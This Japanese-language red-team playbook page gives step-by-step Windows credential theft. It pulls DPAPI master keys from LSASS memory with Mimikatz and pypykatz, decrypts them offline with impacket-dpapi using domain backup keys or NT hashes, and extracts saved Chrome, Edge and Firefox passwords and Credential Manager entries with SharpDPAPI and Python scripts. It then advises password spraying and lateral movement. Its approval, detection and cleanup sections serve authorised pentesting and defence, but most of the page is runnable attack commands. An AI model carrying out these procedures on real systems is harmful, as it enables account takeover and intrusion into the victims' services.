# DPAPI / ブラウザ保存パスワード取得

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [ ] 業務停止リスク（サービス・認証）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む
> - [x] SIEM/EDR で確実に検知される（LSASS アクセスによるマスターキー取得は Defender for Endpoint が検知。SQLite ファイルへのアクセスは監査ログ対象）
>
> 実施可否は事前合意で明示確認すること。取得情報は暗号化保管・案件後破棄が必須。演習環境（HTB / OSCP 等）では制約なし。

> 原理（DPAPI の暗号構造・マスターキーの派生ロジック）→ `../06_Concepts/DPAPI.md`（未作成時はこのファイルの「仕組みと前提」セクションを参照）

---

## 仕組みと前提

**DPAPI（Data Protection API）とは：** Windows に組み込まれた暗号化 API。アプリケーションがユーザーごとのシークレット（ブラウザのパスワード・Wi-Fi キー・RDP 認証情報等）を安全に保存するために使う。暗号化はユーザーのログインパスワードから派生したマスターキーで行われるため、**正しいマスターキーさえ持っていれば任意のタイミングで復号できる**。

**マスターキーの保存場所：**

```
%APPDATA%\Microsoft\Protect\[USER_SID]\
  ↳ [GUID_FILENAME]    # マスターキーファイル（暗号化済み）
```

例（プレースホルダ表記）：

```
C:\Users\[USER]\AppData\Roaming\Microsoft\Protect\S-1-5-21-[DOMAIN_SID]-[RID]\
  ↳ [MASTERKEY_GUID]
```

**復号の2パターン：**

| パターン | 前提 | 主なツール |
|---------|------|----------|
| **オンライン（セッション内）** | 対象ユーザーのセッションが存在する / LSASS にマスターキーがキャッシュされている | SharpDPAPI・Mimikatz `sekurlsa::dpapi`・pypykatz |
| **オフライン** | ドメインバックアップキー または ユーザーパスワード（NT ハッシュ）を取得済み | impacket-dpapi（dpapi.py）|

---

## パターン 1: オンライン復号（ユーザーセッション内 / LSASS 経由）

### 着火条件

以下のいずれかが成立する場合：
- 対象ユーザーとして Windows シェルを持っている（`whoami` が対象ユーザー）
- LSASS ダンプ済み（pypykatz または Mimikatz で `sekurlsa::dpapi` を実行可能）
- SYSTEM 権限を持っており対象ユーザーの LSASS キャッシュを参照できる

**攻撃者の思考トレース：** LSASS はアクティブな DPAPI マスターキーをメモリにキャッシュしている。`sekurlsa::dpapi` / pypykatz でキャッシュを引き出すことで、マスターキーファイルを復号する手間を省略できる。

### 手順 A — Mimikatz でメモリ内マスターキーを取得

> **事前条件：** SeDebugPrivilege が有効な状態（`Privilege_Tokens.md` の SeDebug セクション参照）

```powershell
# [Target] Mimikatz でマスターキーをメモリから取得
C:\Windows\Temp\mimikatz.exe

# Mimikatz プロンプト内
privilege::debug
sekurlsa::dpapi
# 出力に masterkey: [HEX_STRING] が出る → これが復号に使うマスターキー値
```

**出力の読み方（抜粋）：**

```
Authentication Id : 0 ; [SESSION_ID] (LUID)
Session           : Interactive from 1
User Name         : [USER]
Domain            : [DOMAIN]
SID               : S-1-5-21-[DOMAIN_SID]-[RID]
[00000000]
         * GUID      : {[MASTERKEY_GUID]}
         * Time      : [TIMESTAMP]
         * MasterKey : [HEX_MASTERKEY]       ← これを控える
         * sha1(key) : [SHA1_OF_MASTERKEY]
```

### 手順 B — SharpDPAPI でブラウザ認証情報を一括取得

> **SharpDPAPI とは：** DPAPI を活用してブラウザ・Credential Manager の暗号化された認証情報を一括復号する .NET ツール（ペネトレ用 Linux ディストリ非搭載・別途転送要）。SYSTEM 権限があればドメインバックアップキーを直接利用できる。

**事前準備（必須）：** SharpDPAPI.exe をターゲットに転送しておく。

```powershell
# [Target] 現在のユーザーセッション内で Chrome/Edge の保存パスワードを復号
C:\Windows\Temp\SharpDPAPI.exe triage

# SYSTEM 権限がある場合（より広範な情報を取得）
C:\Windows\Temp\SharpDPAPI.exe backupkey /nowrap
# → ドメインバックアップキーを取得（オフライン復号パターンで利用可）
```

### 手順 C — pypykatz で LSASS ダンプからマスターキーを取得

LSASS ダンプ済み（`Privilege_Tokens.md` の SeDebug セクション参照）の場合、テスター端末で実行できる。

```bash
# [Attacker] pypykatz で DPAPI マスターキーを抽出
pypykatz lsa minidump lsass.dmp

# 出力の DPAPI セクションから masterkey を控える
```

---

## パターン 2: オフライン復号（ドメインバックアップキーまたはユーザー NT ハッシュを使用）

### 着火条件

以下のいずれかが成立する場合：
- ドメイン管理者相当の権限で **ドメイン DPAPI バックアップキー** を取得できる
- 対象ユーザーの **NT ハッシュ**（または平文パスワード）が判明している
- SAM / SYSTEM / SECURITY ハイブを取得済み

**攻撃者の思考トレース：** DPAPI マスターキーはユーザーのログインパスワードから派生するため、NT ハッシュさえあれば対象ユーザーがログオフしていてもオフラインで復号できる。ドメイン環境ではドメインバックアップキー（DA 権限で取得可）を使えばすべてのユーザーの DPAPI データを復号できる。

### 手順 A — ドメインバックアップキーでオフライン復号（impacket-dpapi）

> **impacket-dpapi（dpapi.py）とは：** impacket スイートに含まれる DPAPI 解析ツール（ペネトレ用 Linux ディストリ標準搭載）。ドメインバックアップキーを使ってマスターキーファイルをオフライン復号できる。

**事前準備（必須）：**
1. ドメイン DPAPI バックアップキーを取得する
2. 対象ユーザーの `%APPDATA%\Microsoft\Protect\[SID]\` 配下のマスターキーファイルを取得する

```bash
# [Attacker] ドメインバックアップキーを取得（DA 権限が必要）
impacket-dpapi backupkeys \
  --export \
  -t '[DOMAIN]/[DA_USER]:[PASSWORD]@[DC_IP]'
# カレントディレクトリに ntbackupkey_[GUID].pvk として保存される
```

```bash
# [Attacker] マスターキーファイルをバックアップキーで復号
impacket-dpapi masterkey \
  -file '/path/to/[MASTERKEY_GUID]' \
  -pvk '/path/to/ntbackupkey_[GUID].pvk'
# 出力に Decrypted key: [HEX_MASTERKEY] が出る
```

```bash
# [Attacker] 暗号化された DPAPI データ（Blob）を復号
impacket-dpapi credential \
  -file '/path/to/[CREDENTIAL_FILE]' \
  -key '[HEX_MASTERKEY]'
```

### 手順 B — NT ハッシュでマスターキーをオフライン復号

```bash
# [Attacker] NT ハッシュからマスターキーを復号
impacket-dpapi masterkey \
  -file '/path/to/[MASTERKEY_GUID]' \
  -sid 'S-1-5-21-[DOMAIN_SID]-[RID]' \
  -password '[USER_PASSWORD]'
# または NT ハッシュを直接使う場合
impacket-dpapi masterkey \
  -file '/path/to/[MASTERKEY_GUID]' \
  -sid 'S-1-5-21-[DOMAIN_SID]-[RID]' \
  -hash '[NT_HASH]'
```

---

## Chrome / Edge の保存パスワードを取得

### 概要

Chrome・Edge は DPAPI で暗号化されたパスワードを SQLite データベース（`Login Data`）に保存する。

**ファイルの場所：**

```
Chrome: C:\Users\[USER]\AppData\Local\Google\Chrome\User Data\Default\Login Data
Edge:   C:\Users\[USER]\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
```

**暗号化の仕組み：** Chrome 80 以降はアプリケーションレベルの追加暗号化（AES-256-GCM）を使う。この鍵は `Local State` ファイルの `encrypted_key` フィールドに DPAPI で暗号化されて保存されている。

**ファイルの場所（Local State）：**

```
Chrome: C:\Users\[USER]\AppData\Local\Google\Chrome\User Data\Local State
Edge:   C:\Users\[USER]\AppData\Local\Microsoft\Edge\User Data\Local State
```

### 手順 A — SharpChrome / SharpDPAPI でワンショット取得

```powershell
# [Target] SharpDPAPI でブラウザ認証情報を一括取得（現在のユーザーとして実行）
C:\Windows\Temp\SharpDPAPI.exe triage

# または SharpChrome を使う（Chrome 専用）
C:\Windows\Temp\SharpChrome.exe logins
```

### 手順 B — 手動で SQLite から取得してオフライン復号

**事前準備（必須）：** Chrome/Edge が起動中の場合は `Login Data` がロックされているため、コピーしてから操作する。

```powershell
# [Target] Login Data をコピー（ロック回避）
copy "C:\Users\[USER]\AppData\Local\Google\Chrome\User Data\Default\Login Data" C:\Windows\Temp\LoginData_bk
copy "C:\Users\[USER]\AppData\Local\Google\Chrome\User Data\Local State" C:\Windows\Temp\LocalState_bk

# [Target] ダウンロード
download C:\Windows\Temp\LoginData_bk
download C:\Windows\Temp\LocalState_bk
```

```bash
# [Attacker] Python で SQLite から暗号化パスワードを抽出して確認
python3 - <<'EOF'
import sqlite3, json, base64

db = sqlite3.connect('LoginData_bk')
cursor = db.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
for row in cursor.fetchall():
    url, user, enc_pass = row
    print(f"URL: {url}")
    print(f"User: {user}")
    print(f"EncryptedPass (hex): {enc_pass.hex()[:40]}...")  # 先頭40文字のみ表示
db.close()
EOF
# v10 プレフィックス（0x763130 / "v10"）が付いている場合 → Chrome 80+ の AES-GCM 暗号化
```

```bash
# [Attacker] impacket-dpapi で復号（マスターキー取得済みの場合）
# Local State の encrypted_key を取得
python3 -c "
import json, base64
with open('LocalState_bk') as f:
    ls = json.load(f)
enc_key_b64 = ls['os_crypt']['encrypted_key']
enc_key = base64.b64decode(enc_key_b64)[5:]  # DPAPIプレフィックス(DPAPI=5バイト)を除去
print(enc_key.hex())
"
# → 出力の hex 値を impacket-dpapi credential で復号してアプリケーションキーを取得
```

---

## Firefox の保存パスワードを取得

### 概要

Firefox は PKCS#12 / NSS（Network Security Services）を使ってパスワードを保存する。DPAPI は使用しない。

**ファイルの場所：**

```
C:\Users\[USER]\AppData\Roaming\Mozilla\Firefox\Profiles\[PROFILE_GUID].default-release\
  ├── logins.json    # 暗号化されたパスワードエントリ
  └── key4.db        # 暗号化に使うマスターキー（SQLite 形式）
```

**暗号化の仕組み：** マスターパスワードが設定されていない場合（多くのユーザーは未設定）は、既知の固定鍵から復号できる。

### 手順 — firepwd または firefox_decrypt を使用

> **firepwd とは：** Firefox の NSS データベースからパスワードを復号する Python スクリプト（ペネトレ用 Linux ディストリ非搭載・要インストール）。
> **firefox_decrypt とは：** Firefox の認証情報を取得する代替 Python ツール（GitHub で公開中）。

```powershell
# [Target] 必要ファイルをダウンロード
download "C:\Users\[USER]\AppData\Roaming\Mozilla\Firefox\Profiles\[PROFILE_GUID].default-release\logins.json"
download "C:\Users\[USER]\AppData\Roaming\Mozilla\Firefox\Profiles\[PROFILE_GUID].default-release\key4.db"
```

```bash
# [Attacker] firepwd で復号（マスターパスワードなしの場合）
pip install firepwd --break-system-packages
python3 -m firepwd -d /path/to/profile/dir/
# 出力例：
# Global salt: [SALT_HEX]
# decrypting login/password pairs
# https://example.com:[USER]:[PASSWORD]

# [Attacker] firefox_decrypt を使う場合
python3 firefox_decrypt.py /path/to/profile/dir/
```

**マスターパスワードが設定されている場合：**

```bash
# [Attacker] マスターパスワードを試す（判明している場合）
python3 -m firepwd -d /path/to/profile/dir/ -p '[MASTER_PASSWORD]'
# 不明な場合は hashcat でマスターパスワードをクラックする（firepwd がハッシュを出力する）
```

---

## Windows Credential Manager（認証情報マネージャー）の取得

### 概要

Credential Manager は Web 認証情報・Windows 認証情報（RDP・SMB・SharePoint 等）を `%LOCALAPPDATA%\Microsoft\Credentials\` に保存する。いずれも DPAPI で暗号化されている。

```powershell
# [Target] 保存されている認証情報を列挙（平文では出ない）
cmdkey /list

# 出力例：
# 対象: Domain:target=TERMSRV/[REMOTE_HOST]
# 種類: ドメイン パスワード
# ユーザー: [DOMAIN]\[USER]
```

```powershell
# [Target] SharpDPAPI で Credential Manager を復号
C:\Windows\Temp\SharpDPAPI.exe credentials /unprotect
```

```bash
# [Attacker] Mimikatz でオンライン取得（SYSTEM または対象ユーザーコンテキスト）
# dpapi::cred /in:C:\Users\[USER]\AppData\Local\Microsoft\Credentials\[CREDENTIAL_GUID]
# マスターキーを指定する場合
# dpapi::cred /in:[PATH] /masterkey:[HEX_MASTERKEY]
```

---

## 刺さらなかったとき（DPAPI 全般）

| 現象 | 原因 | 代替 |
|------|------|------|
| `sekurlsa::dpapi` が空 / マスターキーが出ない | 対象ユーザーがオフライン / LSASSキャッシュ対象外 | オフライン復号パターンに切り替える |
| impacket-dpapi でマスターキー復号が失敗 | SID / パスワードの誤り、またはバックアップキーが異なる | ユーザーの SID を `impacket-lookupsid` で再確認 |
| Chrome の `Login Data` がロックされている | ブラウザが起動中 | `copy` でコピーしてからオフライン解析 |
| Chrome パスワードが `v10` プレフィックスで始まるが復号できない | Local State の `encrypted_key` の復号が必要 | Local State も取得して AES-GCM キーを先に復号する |
| Firefox にマスターパスワードが設定されている | firepwd でパスワードなし復号が失敗 | マスターパスワードのクラックを試みる（hashcat） |
| SharpDPAPI がブロックされる | AV シグネチャ検知 | 難読化版または PowerShell 実装の代替ツール |

---

## 昇格成功後に確認すること（横展開観点）

DPAPI・ブラウザ認証情報の取得に成功したら以下を優先して確認する：

- **ブラウザ保存パスワード（URL + 認証情報）** → VPN ポータル・社内 SaaS・クラウドコンソール・外部 SSH への横展開
- **Credential Manager の RDP/SMB 認証情報** → `TERMSRV/[HOST]` エントリは直接 RDP で使える認証情報
- **SharePoint / Teams / Exchange の認証情報** → 追加の内部情報へのアクセス
- **パスワードの使い回し確認** → 取得した平文パスワードを netexec で SMB / WinRM スプレー

---

### 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。ブラウザ保存パスワードは業務システム・個人情報に直結し、プライバシー影響が最大クラス
- **想定されるSIEM/EDR検知**:
  - LSASS アクセス（マスターキー取得）→ Defender for Endpoint の「LSASS Memory Access」アラート
  - SharpDPAPI / Mimikatz の実行 → AV シグネチャ検知（Event ID 4688）
  - `Login Data` / `key4.db` / `logins.json` へのアクセス → ファイル監査ログ（監査ポリシーが有効な場合）
  - ドメインバックアップキー取得（LSARPC `LsaRetrievePrivateData`）→ Defender for Identity のアラート
  - **Sysmon Event ID 10（ProcessAccess to lsass.exe）**: `sekurlsa::dpapi` / pypykatz によるLSASSマスターキー取得時に記録。GrantedAccess `0x1010` が典型値。`targetImage: lsass.exe` フィルタで確実に捕捉される
  - **Sysmon Event ID 11（FileCreate）**: `Login Data` / `key4.db` / `logins.json` / `LocalState` のコピー操作が記録される。Sysmon のファイル作成監視が有効な場合は `C:\Windows\Temp\*` への書き出しも記録対象
  - **EDR アラート名（例）**: Defender for Endpoint「Suspicious access to browser credential store」、CrowdStrike「Credential Access: Browser Stored Credentials」、SentinelOne「DPAPI Master Key Access via LSASS」
- **業務影響リスク**: なし（読み取り操作のみ）
- **原状回復必須項目**:
  - ✅ コピーした `Login Data` / `key4.db` / `logins.json` / `LocalState` の一時ファイルを削除
  - ✅ 転送したツールバイナリ（SharpDPAPI / SharpChrome 等）を削除
  - ✅ 取得したパスワード一覧・マスターキー値の暗号化保管 → 案件終了時破棄
  - ✅ ドメインバックアップキーファイル（`.pvk`）の暗号化保管 → 案件終了時破棄
- **取得情報の取扱**: 平文パスワード・マスターキーは最高機密扱い。取得直後に暗号化コンテナへ移動し、アクセスログを記録する
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：LSASS ダンプでマスターキーをメモリから取得 → `./Privilege_Tokens.md`（SeDebug セクション）
- 前：SAM/SYSTEM/SECURITY ダンプでオフライン復号の準備 → `./Privilege_Tokens.md`（SeBackup セクション）・`./Credential_Dumping.md`
- 後：取得した平文パスワードの使い回し確認 → `../02_Initial_Access/Credential_Discovery.md`
- 後：取得した NTLM ハッシュで Pass-The-Hash → `./Credential_Dumping.md`
- 後：取得した RDP 認証情報で横断移動 → `./Enumeration_Checklist.md`（Step 7.5 PSSession）
